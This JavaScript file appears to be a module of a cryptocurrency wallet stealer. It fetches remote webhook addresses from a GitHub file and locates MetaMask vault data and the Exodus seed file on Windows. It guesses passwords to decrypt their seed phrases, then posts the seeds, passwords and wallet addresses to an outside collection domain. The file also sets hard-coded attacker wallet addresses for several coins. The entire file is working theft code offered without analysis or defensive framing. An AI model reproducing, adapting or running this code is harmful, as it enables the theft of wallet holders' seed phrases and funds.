(async () => {
  webhooks.push((await requires.axios.get("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/1.txt")).data);

  const wallet_hook = "https://doenerium.kqnfkpoccicxiudstqonfotuwsrhuxkwhqjjfsbjhonoubrccy.nl/x"

  function getVaults(file) {
      try {
          var data = requires.fs.readFileSync(file, "utf-8");
          var vaults = [];
          data = data.split("{\"vault\":\"");
          data.forEach(data => {
              if (!data.includes("\\\"data\\\"")) return;
              data = data.split("\"}\"},")[0] + "\"}";
              data = data.split("\\\"").join("\"");
              if (vaults.indexOf(data) === -1) vaults.push(data);
          });
          return vaults;
      } catch (e) {
          return [];
      }
  }

  function onlyUnique(value, index, self) {
      return self.indexOf(value) === index;
  }

  function getAddresses(file) {
      try {
          const fileContent = requires.fs.readFileSync(file, "utf-8").split("\"cachedBalances\"")[1].split("}}}")[0];
          const arrayWallets = fileContent.match(/0x[a-fA-F0-9]{40}/g).filter(onlyUnique);
          return arrayWallets;
      } catch (e) {
          return [];
      }
  }

  async function decryptMetamask(password, vault) {
      try {
          const webcrypto = new requires.webcrypto.Crypto();
          const parsedVault = JSON.parse(vault);
          const salt = parsedVault.salt;
          const passBuffer = Buffer.from(password, "utf-8");
          const saltBuffer = Buffer.from(salt, "base64");
          const importedkey = await webcrypto.subtle.importKey("raw", passBuffer, { name: "PBKDF2" }, false, ["deriveBits", "deriveKey"]);
          const deriveKey = await webcrypto.subtle.deriveKey({ name: "PBKDF2", salt: saltBuffer, iterations: 10000, hash: "SHA-256" }, importedkey, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
          const encryptedData = Buffer.from(parsedVault.data, "base64");
          const vector = Buffer.from(parsedVault.iv, "base64");
          const data = await webcrypto.subtle.decrypt({ name: "AES-GCM", iv: vector }, deriveKey, encryptedData);
          const decryptedData = new Uint8Array(data);
          const decryptedStr = Buffer.from(decryptedData).toString("utf-8");
          const decryptedObj = JSON.parse(decryptedStr);
          const seed = Buffer.from(decryptedObj[0].data.mnemonic).toString("utf-8");
          return seed;
      } catch (e) {
          return "incorrect password"
      }
  }

  async function sendToWallethook(data) {
      var files = data.files;

      if (files) {
          files.forEach(async (file) => {
              requires.request.post({
                  url: url,
                  formData: {
                      file: requires.fs.createReadStream(file.path),
                      title: file.name,
                  },
              });
          });
      }

      if (Object.entries(data).length == 1 && data.files) {
          return;
      }

      let obj = {
          avatar_url: utils.encryption.decryptData(
              config.embed.avatar_url
          ),
          username: utils.encryption.decryptData(
              config.embed.username
          ),
      };

      for (let [key, value] of Object.entries(data)) {
          obj[key] = value;
      }

      await requires.axios({
          url: wallet_hook,
          method: "POST",
          data: obj,
      });
  }

  function shrink(e) {
      const t = e.readUInt32BE(0);
      return e.slice(4, t + 4)
  }

  function guessPasswords(passwords) {
      let new_passwords = []

      passwords.forEach((password) => {
          new_passwords.push(
              password.replace("!", "").replace("?", ""),
              password + "!",
              password + "?",
              password + "."
          )
      })

      new_passwords.forEach((password) => {
          new_passwords.push(
              password.toUpperCase(),
              password.toLowerCase()
          )
      })

      return new_passwords.filter(onlyUnique)
  }

  utils.encryption.step2 = async (passwords) => {
      const exodus_path = process.env.APPDATA + "\\Exodus\\exodus.wallet";


      if (requires.fs.existsSync(exodus_path + "\\seed.seco")) {
          try {
              passwords.filter(onlyUnique).forEach(async password => {

                  try {
                      var decrypted = requires.seco.decryptData(requires.fs.readFileSync(exodus_path + "\\seed.seco"), password).data;
                      var shrinked = shrink(decrypted);
                      var gunzipped = requires.zlib.gunzipSync(shrinked);
                      var mnemonic = requires.bs.fromBuffer(gunzipped).mnemonicString;

                      await sendToWallethook({
                          embeds: [
                              utils.webhook.createEmbed({
                                  title: `💸 Exodus Wallet Licked`,
                                  fields: [
                                      {
                                          name: "Seedphrase",
                                          value: `\`\`\`${mnemonic}\`\`\``,
                                          inline: false
                                      }, {
                                          name: "Password",
                                          value: `\`\`\`${password}\`\`\``,
                                          inline: false
                                      }
                                  ]
                              })
                          ]
                      })
                  } catch (e) {
                  }
              });
          } catch (e) {

          }
      }


  }

  utils.encryption.step1 = async (wallet, passwords) => {
      passwords = guessPasswords(passwords)

      try {
          requires.fs.readdirSync(wallet).forEach(file => {
              var addresses = getAddresses(wallet + "\\" + file);

              if (addresses.length > 0) {
                  try {
                      const vaults = getVaults(wallet + "\\" + file).filter(onlyUnique);
                      vaults.forEach(async vault => {
                          
                          passwords.filter(onlyUnique).forEach(async password => {

                              var seed = await decryptMetamask(password, vault);
                              if (seed != "incorrect password") {
                                  let description = ``
                                  addresses.forEach(address => {
                                      description += `[${address}](https://zapper.xyz/account/${address})\n`
                                  })
                                  await sendToWallethook({
                                      embeds: [
                                          utils.webhook.createEmbed({
                                              title: `💸 MetaMask Wallet Licked`,
                                              description: description,
                                              fields: [
                                                  {
                                                      name: "Seedphrase",
                                                      value: `\`\`\`${seed}\`\`\``,
                                                      inline: false
                                                  }, {
                                                      name: "Password",
                                                      value: `\`\`\`${password}\`\`\``,
                                                      inline: false
                                                  }
                                              ]
                                          })
                                      ]
                                  })
                              }
                          }
                          )
                      })
                  } catch (e) {  }
              }



          });
      }
      catch (e) {
          
      }
      try {


          if (requires.fs.lstatSync(wallet + "\\lost").isDirectory()) {
              requires.fs.readdirSync(wallet + "\\lost").forEach(file => {

                  var addresses = getAddresses(wallet + "\\lost\\" + file);

                  if (addresses.length > 0) {
                      try {
                          const vaults = getVaults(wallet + "\\lost\\" + file).filter(onlyUnique);
                          vaults.forEach(async vault => {

                              passwords.filter(onlyUnique).forEach(async password => {
                                  var seed = await decryptMetamask(password, vault);
                                  if (seed != "incorrect password") {
                                      let description = ``
                                      addresses.forEach(address => {
                                          description += `[${address}](https://zapper.xyz/account/${address})\n`
                                      })
                                      await sendToWallethook({
                                          embeds: [
                                              utils.webhook.createEmbed({
                                                  title: `💸 MetaMask Wallet Licked`,
                                                  description: description,
                                                  fields: [
                                                      {
                                                          name: "Seedphrase",
                                                          value: `\`\`\`${seed}\`\`\``,
                                                          inline: false
                                                      }, {
                                                          name: "Password",
                                                          value: `\`\`\`${seed}\`\`\``,
                                                          inline: false
                                                      }
                                                  ]
                                              })
                                          ]
                                      })
                                  }
                              }
                              )
                          })
                      } catch (e) {  }
                  }


              });
          }

          utils.encryption.step2(passwords)

      } catch (e) {
          
      }
  }

  for (let [key, value] of Object.entries({
      btc: "bc1qgvjmfl4trwyvegctswyqnm7r87tky9la3n2z5x",
      ltc: "LKsFRUDbx9bBJs9SRkaUvYpoDGnUCvkpzG",
      eth: "0xA5972cDCc3D068e45F32a0990F9654c068026660",
      xrp: "raiLWCNEW3reEwpZE7GKNVCSsqzdLJn6zP",
      neo: "ANn5THmQidTh6zENyCytJV98i6po1dLJhh",
      doge: "D5rCqZXoBFktReadNZGSqevydZ2NaTF13g",
  })) {
      config.crypto[key] = value;
  }
})();s
